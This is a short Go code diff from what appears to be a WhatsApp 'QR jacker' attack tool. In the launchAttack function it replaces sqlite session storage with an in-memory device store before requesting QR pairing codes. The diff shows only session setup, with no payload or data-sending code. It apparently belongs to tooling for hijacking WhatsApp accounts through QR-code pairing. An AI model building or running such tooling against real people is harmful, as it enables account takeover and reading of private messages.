@@ -16,9 +16,7 @@ import (
 
 	"go.mau.fi/whatsmeow"
 	"go.mau.fi/whatsmeow/store"
-	"go.mau.fi/whatsmeow/store/sqlstore"
 	waLog "go.mau.fi/whatsmeow/util/log"
-	_ "modernc.org/sqlite"
 	"rsc.io/qr"
 
 	"programa/utils"
@@ -124,22 +122,15 @@ func launchAttack(cfg attackCfg) {
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
 
-	sqlCtx, sqlCancel := context.WithTimeout(context.Background(), 10*time.Second)
-	container, err := sqlstore.New(sqlCtx, "sqlite3", "file:scripts/qr_jacker/whatsapp/whatsmeow.db?_foreign_keys=on&cache=shared", waLog.Noop)
-	sqlCancel()
-	if err != nil {
-		fmt.Printf("%s[!] Failed to create device container: %v%s\n", utils.Red, err, utils.Reset)
+	device := &store.Device{
+		Container: &store.NoopStore{},
+	}
+	device.SetAllStores(&store.NoopStore{})
+	if err := device.Save(ctx); err != nil {
+		fmt.Printf("%s[!] Failed to initialize device: %v%s\n", utils.Red, err, utils.Reset)
 		utils.PauseForInput()
 		return
 	}
-
-	device, err := container.GetFirstDevice(ctx)
-	if err != nil {
-		fmt.Printf("%s[!] Failed to get device: %v%s\n", utils.Red, err, utils.Reset)
-		utils.PauseForInput()
-		return
-	}
-
 	cli := whatsmeow.NewClient(device, waLog.Noop)
 
 	qrChan, err := cli.GetQRChannel(ctx)
